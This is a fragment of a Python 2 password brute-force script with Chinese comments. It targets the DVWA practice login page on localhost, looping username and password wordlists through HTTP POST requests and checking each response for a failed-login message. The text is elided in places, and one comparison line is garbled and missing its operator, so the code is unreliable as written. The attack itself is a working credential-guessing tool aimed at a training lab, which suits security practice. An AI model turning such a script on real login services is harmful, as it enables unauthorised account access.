...
headers = {"Content-Type":"application/x-www-form-urlencoded",     
           ...
           "Referer":"http://127.0.0.1/dvwa/login.php"};# referer:是代理的访问来源地址
# lock = threading.Lock()
def tryUser(user,password):
    #print user,password
    global headers
    global outFile 
    conn = httplib.HTTPConnection("127.0.0.1") # 远程域名
    if len(user) < 3:     # 限制用户名长度，排除字典中的无用数据
        ...
        conn.request(method="POST", url="/dvwa/login.php", body=params, headers=headers) # 后台路径
        responseText = conn.getresponse().read().decode('utf8') # 网页编码
        # print responseText  # 第一次可以打印看看是否解析
        if not responseText.find('Login failed')  0 :
...
if __name__ == '__main__':
    tsk=[] # 创建线程池
    with open(r'user.txt', 'r') as fUser:  # 使用with as 来打开文件,不需自己关闭文件,因为他会自己在合适的时候自已关闭(类似C# 中的using(...){}接口)
        with open(r'passwordlist.txt', 'r') as fPass:
